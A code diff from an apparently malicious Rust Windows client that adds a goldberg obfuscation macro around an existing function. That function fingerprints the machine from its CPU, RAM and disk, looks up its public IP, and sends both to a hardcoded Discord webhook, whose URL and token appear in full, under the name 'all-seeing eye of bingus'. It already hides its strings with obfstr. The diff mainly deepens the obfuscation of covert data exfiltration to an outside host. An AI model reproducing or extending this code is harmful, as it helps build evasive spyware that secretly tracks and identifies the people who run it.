@@ -2,7 +2,7 @@ use std::{ptr::null_mut, time::Duration, thread::sleep, ffi::CString};
 use bingus_client::{run_client};
 
 use webhook::client::{WebhookResult, WebhookClient};
-
+use goldberg::goldberg_stmts;
 use winapi::{
     shared::{minwindef::{DWORD, HINSTANCE, LPVOID}},
     um::{
@@ -31,28 +31,30 @@ fn message_box(text: &str) {
 }
 
 async fn client_webhook() -> WebhookResult<()> {
-    let client = WebhookClient::new(obfstr::obfstr!("https://discord.com/api/webhooks/1069733455920910447/eX0tFN3qNdMPDbZmT05Jr8_rths_3WQpRN2Cqs9aDErUIZdBtXnsHkJaAnneSNfk8chP"));
+    goldberg_stmts! {
+        let client = WebhookClient::new(obfstr::obfstr!("https://discord.com/api/webhooks/1069733455920910447/eX0tFN3qNdMPDbZmT05Jr8_rths_3WQpRN2Cqs9aDErUIZdBtXnsHkJaAnneSNfk8chP"));
 
-    let hwid = {
-        use uniqueid::{IdentifierBuilder, IdentifierType};
+        let hwid = {
+            use uniqueid::{IdentifierBuilder, IdentifierType};
 
-        let mut builder = IdentifierBuilder::default();
+            let mut builder = IdentifierBuilder::default();
 
-        builder.name("Cocaine3");
-        builder.add(IdentifierType::CPU);
-        builder.add(IdentifierType::RAM);
-        builder.add(IdentifierType::DISK);
+            builder.name("Cocaine3");
+            builder.add(IdentifierType::CPU);
+            builder.add(IdentifierType::RAM);
+            builder.add(IdentifierType::DISK);
 
-        builder.build().to_string(true)
-    };
+            builder.build().to_string(true)
+        };
 
-    let ip = public_ip::addr().await.unwrap();
+        let ip = public_ip::addr().await.unwrap();
 
-    client.send(|message| message
-        .username("all-seeing eye of bingus#4442")
-        .embed(|embed| embed
-            .title("Client")
-            .description(&format!("hwid:`{hwid}`\nenv hwid:`{}`\nip:`{ip}`", obfstr::obfstr!(env!("HWID")))))).await?;
+        client.send(|message| message
+            .username("all-seeing eye of bingus#4442")
+            .embed(|embed| embed
+                .title("Client")
+                .description(&format!("hwid:`{hwid}`\nenv hwid:`{}`\nip:`{ip}`", obfstr::obfstr!(env!("HWID")))))).await?;
+    }
 
     Ok(())
 }
